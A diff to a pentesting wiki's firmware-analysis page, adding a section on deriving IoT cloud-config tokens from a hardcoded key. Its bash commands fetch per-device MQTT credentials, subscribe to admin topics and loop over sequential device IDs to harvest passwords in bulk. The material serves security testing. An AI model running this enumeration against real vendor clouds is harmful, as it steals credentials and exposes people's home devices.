@@ -15,6 +15,9 @@ synology-encrypted-archive-decryption.md
 ../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
 {{#endref}}
 
+{{#ref}}
+android-mediatek-secure-boot-bl2_ext-bypass-el3.md
+{{#endref}}
 
 Firmware is essential software that enables devices to operate correctly by managing and facilitating communication between the hardware components and the software that users interact with. It's stored in permanent memory, ensuring the device can access vital instructions from the moment it's powered on, leading to the operating system's launch. Examining and potentially modifying firmware is a critical step in identifying security vulnerabilities.
 
@@ -185,7 +188,86 @@ Several tools assist in uncovering sensitive information and vulnerabilities wit
 
 Both source code and compiled binaries found in the filesystem must be scrutinized for vulnerabilities. Tools like **checksec.sh** for Unix binaries and **PESecurity** for Windows binaries help identify unprotected binaries that could be exploited.
 
-## Emulating Firmware for Dynamic Analysis
+## Harvesting cloud config and MQTT credentials via derived URL tokens
+
+Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like:
+
+- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)
+
+During firmware analysis you may find that <token> is derived locally from the device ID using a hardcoded secret, for example:
+
+- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
+
+This design enables anyone who learns a deviceId and the STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.
+
+Practical workflow:
+
+1) Extract deviceId from UART boot logs
+
+- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
+
+```bash
+picocom -b 115200 /dev/ttyUSB0
+```
+
+- Look for lines printing the cloud config URL pattern and broker address, for example:
+
+```
+Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
+MQTT: mqtt://mq-gw.vendor.tld:8001
+```
+
+2) Recover STATIC_KEY and token algorithm from firmware
+
+- Load binaries into Ghidra/radare2 and search for the config path ("/pf/") or MD5 usage.
+- Confirm the algorithm (e.g., MD5(deviceId||STATIC_KEY)).
+- Derive the token in Bash and uppercase the digest:
+
+```bash
+DEVICE_ID="d88b00112233"
+STATIC_KEY="cf50deadbeefcafebabe"
+printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
+```
+
+3) Harvest cloud config and MQTT credentials
+
+- Compose the URL and pull JSON with curl; parse with jq to extract secrets:
+
+```bash
+API_HOST="https://api.vendor.tld"
+TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
+curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
+# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
+```
+
+4) Abuse plaintext MQTT and weak topic ACLs (if present)
+
+- Use recovered credentials to subscribe to maintenance topics and look for sensitive events:
+
+```bash
+mosquitto_sub -h <broker> -p <port> -V mqttv311 \
+  -i <client_id> -u <username> -P <password> \
+  -t "<topic_prefix>/<deviceId>/admin" -v
+```
+
+5) Enumerate predictable device IDs (at scale, with authorization)
+
+- Many ecosystems embed vendor OUI/product/type bytes followed by a sequential suffix.
+- You can iterate candidate IDs, derive tokens and fetch configs programmatically:
+
+```bash
+API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
+for SUF in $(seq -w 000000 0000FF); do
+  DEVICE_ID="${PREFIX}${SUF}"
+  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
+  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
+done
+```
+
+Notes
+- Always obtain explicit authorization before attempting mass enumeration.
+- Prefer emulation or static analysis to recover secrets without modifying target hardware when possible.
+
 
 The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.
 
@@ -307,6 +389,9 @@ To practice discovering vulnerabilities in firmware, use the following vulnerabl
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 - [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+
+
+- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
 
 ## Trainning and Cert
 
